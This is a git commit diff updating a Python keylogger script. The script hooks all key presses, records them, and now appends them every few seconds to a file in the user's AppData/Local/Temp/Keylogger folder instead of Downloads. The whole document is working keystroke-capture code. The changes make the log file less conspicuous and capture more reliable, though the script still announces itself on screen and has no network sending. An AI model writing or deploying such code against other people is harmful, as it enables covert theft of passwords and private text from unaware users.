cbc242527f2d887eab14e017d7ad95a09d333214
muratcx <muratmuratov05@gmail.com>
2023-10-07 02:38:15 -0400

    Update keylogger.py

--- keylogger/keylogger.py
+++ keylogger/keylogger.py
@@ -6,14 +6,14 @@ from pathlib import Path
 # Define a list to store recorded keystrokes
 recorded_sequence = []
 
-# Define the path to the user's Downloads folder
-downloads_folder = str(Path.home() / "Downloads")
-
-# Define the file path for the recorded sequence
-file_path = os.path.join(downloads_folder, "recorded_sequence.txt")
+# Define the path to the user's temporary folder
+temp_folder = str(Path.home() / "AppData/Local/Temp/Keylogger")
 
 # Create the directory structure if it doesn't exist
-os.makedirs(os.path.dirname(file_path), exist_ok=True)
+os.makedirs(temp_folder, exist_ok=True)
+
+# Define the file path for the recorded sequence in the temporary folder
+file_path = os.path.join(temp_folder, "recorded_sequence.txt")
 
 # Function to process key events
 def on_key_event(e):
@@ -30,22 +30,53 @@ def on_key_event(e):
         # Append the key to the recorded sequence
         recorded_sequence.append(key)
 
+# Function to save the recorded sequence to a file
+def save_recorded_sequence_to_file(file_path):
+    try:
+        with open(file_path, 'a') as file:  # Use 'a' for append mode
+            file.write("".join(recorded_sequence))
+        print(f"Recorded sequence saved to '{file_path}'")
+    except Exception as e:
+        print(f"Error: {e}")
+
+# Function to save the recorded data and reset the sequence
+def save_and_clear_sequence(file_path):
+    if len(recorded_sequence) > 0:
+        save_recorded_sequence_to_file(file_path)
+        recorded_sequence.clear()  # Clear the recorded data
+
+# Set the idle time threshold in seconds (adjust as needed)
+idle_time_threshold = 3  # 3 seconds of inactivity
+
+# Initialize the last activity time
+last_activity_time = time.time()
+
 try:
-    print("Recording... Press 'esc' to stop.")
+    print("Recording... Press 'esc' to stop and save.")
 
     # Create a keyboard listener
     keyboard.on_press(on_key_event)
 
     while True:
         # Continuously run and capture keystrokes
-        # Save the recorded sequence to the Downloads folder
-        with open(file_path, 'w') as file:
-            file.write("".join(recorded_sequence))
-        print(f"Recorded sequence saved to '{file_path}'")
+
+        # Check if the 'esc' key has been pressed to exit the loop
+        if keyboard.is_pressed('esc'):
+            break
+ 
+        # Check for inactivity and save data if the threshold is reached
+        current_time = time.time()
+        if (current_time - last_activity_time) >= idle_time_threshold:
+            save_and_clear_sequence(file_path)
+            last_activity_time = current_time  # Update last activity time
+
         time.sleep(1)  # Sleep for 1 second before checking again
 
 except KeyboardInterrupt:
     pass
 finally:
+    # Ensure the recorded data is saved before exiting
+    save_and_clear_sequence(file_path)
+
     # Unhook all keyboard events
     keyboard.unhook_all()
